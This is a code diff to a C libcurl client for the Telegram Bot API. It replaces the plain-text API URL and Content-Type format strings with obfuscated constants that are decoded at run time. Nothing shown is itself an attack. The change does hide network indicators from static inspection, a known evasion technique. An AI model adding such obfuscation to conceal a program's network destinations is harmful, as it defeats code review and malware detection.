@@ -17,6 +17,7 @@
 
 #include "telegram_platform.h"
 #include "../logging/logging.h"
+#include "../crypto/obfuscate.h"
 #include "c2t_version.h"
 
 #include <curl/curl.h>
@@ -116,18 +117,20 @@ int telegram_http_post(const char *token, const char *method,
 
     c2t_log_debug("https", "POST %s (%llu-byte body, content-type=%s)",
                   method, (unsigned long long)body_length, content_type);
+    char url_fmt[OBF_URL_API_BOT_FORMAT_LEN + 1];
+    DEOBF_URL_API_BOT_FORMAT(url_fmt);
     char url[320];
-    int url_length = snprintf(url, sizeof(url),
-                              "https://api.telegram.org/bot%s/%s",
-                              token, method);
+    int url_length = snprintf(url, sizeof(url), url_fmt, token, method);
     if (url_length < 0 || (size_t)url_length >= sizeof(url)) {
         return 0;
     }
 
+    char ct_fmt[OBF_HEADER_CONTENT_TYPE_FORMAT_LEN + 1];
+    DEOBF_HEADER_CONTENT_TYPE_FORMAT(ct_fmt);
     char content_type_header[192];
     int header_length = snprintf(content_type_header,
                                  sizeof(content_type_header),
-                                 "Content-Type: %s", content_type);
+                                 ct_fmt, content_type);
     if (header_length < 0 || (size_t)header_length >=
         sizeof(content_type_header)) {
         return 0;
@@ -203,18 +206,20 @@ int telegram_http_post_stream(const char *token, const char *method,
 
     c2t_log_debug("https", "POST stream %s (%llu-byte stream, content-type=%s)",
                   method, (unsigned long long)stream->total_size, content_type);
+    char url_fmt[OBF_URL_API_BOT_FORMAT_LEN + 1];
+    DEOBF_URL_API_BOT_FORMAT(url_fmt);
     char url[320];
-    int url_length = snprintf(url, sizeof(url),
-                              "https://api.telegram.org/bot%s/%s",
-                              token, method);
+    int url_length = snprintf(url, sizeof(url), url_fmt, token, method);
     if (url_length < 0 || (size_t)url_length >= sizeof(url)) {
         return 0;
     }
 
+    char ct_fmt[OBF_HEADER_CONTENT_TYPE_FORMAT_LEN + 1];
+    DEOBF_HEADER_CONTENT_TYPE_FORMAT(ct_fmt);
     char content_type_header[192];
     int header_length = snprintf(content_type_header,
                                  sizeof(content_type_header),
-                                 "Content-Type: %s", content_type);
+                                 ct_fmt, content_type);
     if (header_length < 0 || (size_t)header_length >= sizeof(content_type_header)) {
         return 0;
     }
@@ -279,10 +284,10 @@ int telegram_http_get(const char *token, const char *method_and_query,
     response_out[0] = '\0';
     c2t_log_debug("https", "GET %s", method_and_query);
 
+    char url_fmt[OBF_URL_API_BOT_FORMAT_LEN + 1];
+    DEOBF_URL_API_BOT_FORMAT(url_fmt);
     char url[512];
-    int url_length = snprintf(url, sizeof(url),
-                              "https://api.telegram.org/bot%s/%s",
-                              token, method_and_query);
+    int url_length = snprintf(url, sizeof(url), url_fmt, token, method_and_query);
     if (url_length < 0 || (size_t)url_length >= sizeof(url)) {
         return 0;
     }
